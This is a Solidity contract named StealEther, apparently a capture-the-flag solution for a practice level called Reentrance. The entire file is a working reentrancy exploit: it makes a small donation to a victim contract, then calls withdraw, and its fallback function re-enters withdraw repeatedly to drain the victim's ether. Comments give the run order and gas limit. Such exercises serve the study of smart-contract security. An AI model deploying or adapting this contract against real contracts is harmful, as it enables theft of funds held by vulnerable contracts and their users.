pragma solidity ^0.4.18;

import "./Reentrance.sol";

contract StealEther {
    Reentrance private victim;

    function StealEther(address _contractVictim) public {
        victim = Reentrance(_contractVictim);
    }

    // Run before run bleedItEmpty
    function pretendToDonate() public payable {
        victim.donate.value(msg.value)(address(this));
    }

    // Run 1M gas limit
    function bleedItEmpty() public {
        victim.withdraw(0.5 ether);
    }

    function() public payable {
        bleedItEmpty();
    }

    function checkBalance() public view returns(uint) {
        return address(this).balance;
    }
}